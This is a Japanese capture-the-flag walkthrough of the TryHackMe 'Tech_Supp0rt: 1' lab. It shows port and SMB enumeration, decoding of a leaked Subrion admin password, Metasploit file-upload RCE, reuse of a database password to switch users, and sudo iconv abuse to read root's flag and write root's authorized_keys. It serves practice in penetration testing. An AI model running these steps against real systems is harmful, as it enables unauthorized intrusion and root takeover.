# Tech_Supp0rt: 1 CTF

https://tryhackme.com/room/techsupp0rt1

```text
注: この部屋で遭遇するテーマとセキュリティ警告はチャレンジの一部です。
```

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.202.67
root@ip-10-10-40-236:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-13 06:08 GMT
Nmap scan report for 10.10.202.67
Host is up (0.0034s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:00:F1:93:F0:E7 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.00 seconds
root@ip-10-10-40-236:~# sudo nmap -sV -p22,80,139,445 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-13 06:09 GMT
Nmap scan report for 10.10.202.67
Host is up (0.00019s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:00:F1:93:F0:E7 (Unknown)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-40-236:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.202.67
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.202.67/wordpress/]
/test                 (Status: 301) [Size: 311] [--> http://10.10.202.67/test/]
/phpinfo.php          (Status: 200) [Size: 94930]
/server-status        (Status: 403) [Size: 277]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

/test と /wordpress の下を gobuster をかけたり、wpscan を実行したが、特に何も出なかった。

### SMB

```shell
$ enum4linux -S 10.10.202.67
```

を実行し、webstr という共有名が存在することが判明。

```shell
$ smbclient //10.10.202.67/websvr

smb: \> ls
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

                8460484 blocks of size 1024. 5507312 blocks available
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

enter.txt をダウンロード

```shell
$ cat enter.txt
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```

7sKvntXdPEJaxazce9PXi24zaFrLiKWCk は、Base58、Base32、Base64 すると「Scam2021」になる。（CyberChef の Magic）

## /subrion

http://10.10.202.67/subrion/ を GET すると、  
http://10.0.2.15/subrion/subrion/ に転送される。

「doesn't work」はそのとおりだが、「edit from panel」とはどういう意味か？

Burp でリクエストをキャッチして、Host:を 10.0.2.15 に変えるなどして無理やり整合性を合わせたら、ページが表示され、SubrionCMS の説明が表示された。

### 脆弱性検索

```shell
$ searchsploit subrion
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Subrion 3.x - Multiple Vulnerabilities                                            | php/webapps/38525.txt
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                           | php/webapps/47469.txt
Subrion Auto Classifieds - Persistent Cross-Site Scripting                        | php/webapps/14391.txt
SUBRION CMS - Multiple Vulnerabilities                                            | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                        | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                                      | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                        | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scr | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                                                 | php/webapps/40202.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                            | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                         | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                  | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                          | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                             | php/webapps/51110.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

ファイルアップロード脆弱性

```shell
$ python3 ./49876.py -u http://10.10.202.67/subrion/panel -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422

[+] Trying to connect to: http://10.10.202.67/subrion/panel
[+] Success!
[+] Got CSRF token: DSRTXzxtkudye14E2CDxVj7vziITfgzg4XODWhTp
[+] Trying to log in...

[x] Login failed... Check credentials
```

エクスプロイトは失敗したが、/subrion/panel が存在することが分かった。ブラウザでログイン画面が表示され、認証情報を使ってログインできた。

アップロード機能から shell.php をアップロードしてみたが、Forbidden で実行できなかった。

metasploit を試してみると、こちらは成功した。

```shell
msf6 exploit(multi/http/subrion_cms_file_upload_rce) > set PASSWORD Scam2021
PASSWORD => Scam2021
msf6 exploit(multi/http/subrion_cms_file_upload_rce) > set RHOSTS 10.10.202.67
RHOSTS => 10.10.202.67
msf6 exploit(multi/http/subrion_cms_file_upload_rce) > set TARGETURI /subrion
TARGETURI => /subrion
msf6 exploit(multi/http/subrion_cms_file_upload_rce) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(multi/http/subrion_cms_file_upload_rce) > exploit
```

シェル取得成功。

## 権限昇格１

```shell
ls -al /home
total 12
drwxr-xr-x  3 root     root     4096 May 28  2021 .
drwxr-xr-x 23 root     root     4096 May 28  2021 ..
drwxr-xr-x  4 scamsite scamsite 4096 May 29  2021 scamsite
www-data@TechSupport:/var/www/html/subrion/uploads$ ls -al /home/scamsite
ls -al /home/scamsite
total 32
drwxr-xr-x 4 scamsite scamsite 4096 May 29  2021 .
drwxr-xr-x 3 root     root     4096 May 28  2021 ..
-rw------- 1 scamsite scamsite  151 May 28  2021 .bash_history
-rw-r--r-- 1 scamsite scamsite  220 May 28  2021 .bash_logout
-rw-r--r-- 1 scamsite scamsite 3771 May 28  2021 .bashrc
drwx------ 2 scamsite scamsite 4096 May 28  2021 .cache
-rw-r--r-- 1 scamsite scamsite  655 May 28  2021 .profile
-rw-r--r-- 1 scamsite scamsite    0 May 28  2021 .sudo_as_admin_successful
drwxr-xr-x 2 root     root     4096 May 29  2021 websvr
```

### SUID

```shell
www-data@TechSupport:/var/www/html/subrion/uploads$ find / -perm -u=s -type f -ls 2>/dev/null
s 2>/dev/null-u=s -type f -l
   391018     28 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /bin/umount
   390985     44 -rwsr-xr-x   1 root     root        44680 May  8  2014 /bin/ping6
   391001     40 -rwsr-xr-x   1 root     root        40128 Mar 27  2019 /bin/su
   400429     32 -rwsr-xr-x   1 root     root        30800 Jul 12  2016 /bin/fusermount
   390974     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /bin/mount
   390984     44 -rwsr-xr-x   1 root     root        44168 May  8  2014 /bin/ping
    18782     36 -rwsr-xr-x   1 root     root        32944 Mar 27  2019 /usr/bin/newuidmap
      146     72 -rwsr-xr-x   1 root     root        71824 Mar 27  2019 /usr/bin/chfn
      148     40 -rwsr-xr-x   1 root     root        40432 Mar 27  2019 /usr/bin/chsh
      273     56 -rwsr-xr-x   1 root     root        54256 Mar 27  2019 /usr/bin/passwd
      263     40 -rwsr-xr-x   1 root     root        39904 Mar 27  2019 /usr/bin/newgrp
    20210     52 -rwsr-sr-x   1 daemon   daemon      51464 Jan 15  2016 /usr/bin/at
      353    136 -rwsr-xr-x   1 root     root       136808 Feb  1  2020 /usr/bin/sudo
    20741     24 -rwsr-xr-x   1 root     root        23376 Mar 27  2019 /usr/bin/pkexec
      204     76 -rwsr-xr-x   1 root     root        75304 Mar 27  2019 /usr/bin/gpasswd
    18781     36 -rwsr-xr-x   1 root     root        32944 Mar 27  2019 /usr/bin/newgidmap
    20737     16 -rwsr-xr-x   1 root     root        14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
      450     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
    19972    420 -rwsr-xr-x   1 root     root       428240 May 27  2020 /usr/lib/openssh/ssh-keysign
   270516     44 -rwsr-xr--   1 root     messagebus    42992 Jun 12  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    18763     84 -rwsr-xr-x   1 root     root          84120 Apr 10  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    20990    112 -rwsr-xr-x   1 root     root         110792 Jul 11  2020 /usr/lib/snapd/snap-confine
    20387     36 -rwsr-xr-x   1 root     root          35600 Mar  6  2017 /sbin/mount.cifs
```

newuidmap, newgidmap という見慣れないコマンドが気になったが、SUID が付いているのが普通とのこと。

### wp-config.php

```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ひみつ' );
```

```shell
MariaDB [wpdb]> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+---------------+----------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email    | user_url                   | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------+----------------------------+---------------------+---------------------+-------------+--------------+
|  1 | support    | $P$BPQkfsaBVCF7.anFFokpMGpfqGKnHM0 | support       | mail@mail.com | http://10.0.2.15/wordpress | 2021-05-29 04:48:49 |                     |           0 | support      |
+----+------------+------------------------------------+---------------+---------------+----------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)
```

ハッシュは、rockyou.txt と 10-million-password-list-top-1000000.txt では割れなかった。

DB のパスワードを使って、scamsite に切り替わることができた。

```shell
www-data@TechSupport:/var/www/html/subrion/uploads$ su scamsite
su scamsite
Password: ひみつ

scamsite@TechSupport:/var/www/html/subrion/uploads$
```

## 権限昇格２

```shell
scamsite@TechSupport:/var/www/html/subrion/uploads$ sudo -l
sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

iconv に sudo が付いている。

```shell
scamsite@TechSupport:/var/www/html/subrion/uploads$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/root.txt
1 -t 8859_1 /root/root.txt9_
85...............................  -
```

## 振り返り

- DB に保存されているパスワードではなく、DB 接続と同じパスワードでユーザー切り替えできる点が盲点になっていて 2 時間近く悩んだ。
- iconv で root.txt を直接読んだが、SSH キーを上書きする方法もあり、そちらの方がスマート。

```shell
echo "<public key>" | sudo iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
```
